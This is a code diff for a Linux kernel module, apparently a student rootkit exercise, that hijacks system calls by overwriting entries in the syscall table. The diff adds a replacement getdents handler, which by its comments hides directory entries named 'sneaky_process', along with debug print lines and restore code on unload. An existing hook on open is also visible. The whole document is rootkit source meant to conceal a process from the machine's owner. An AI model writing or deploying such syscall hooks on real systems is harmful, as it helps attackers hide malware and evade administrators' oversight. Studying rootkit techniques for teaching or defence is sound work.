@@ -78,6 +78,8 @@ asmlinkage int sneaky_getdents (unsigned int fd,
   int examined_size = 0;
   int skipped_size = 0;
 
+  printk("Get Dents!");
+
   // iterate through "dirp ",
   // skip: any dirent with filename == "sneaky_process"
   // the trick for "skip" is: memmove all the dirents that are un-examined to the location of the current dirent
@@ -87,6 +89,8 @@ asmlinkage int sneaky_getdents (unsigned int fd,
       // ha! ISO C90 forbids mixed var declare & code !??
       void* unexamined_start;
       int unexamined_size;
+
+      printk("WWWWW Found!");
       
       skipped_size += (int)(dirp[i].d_reclen);
 
@@ -144,6 +148,10 @@ static int initialize_sneaky_module(void)
   sys_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_open;
 
+  // substitute "getdents" system call (token: __NR_getdents )
+  sys_getdents = (void*)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;
+  
 
   ////////////////////
   ///  clean-ups
@@ -184,7 +192,10 @@ static void exit_sneaky_module(void)
   // recover original "open" system call (token: __NR_open )
   *(sys_call_table + __NR_open) = (unsigned long)sys_open;
 
+  // recover original "getdents" system call (token: __NR_getdents )
+  *(sys_call_table + __NR_getdents) = (unsigned long)sys_getdents;
 
+  
   /////////////////
   ///  clean-ups
   /////////////////
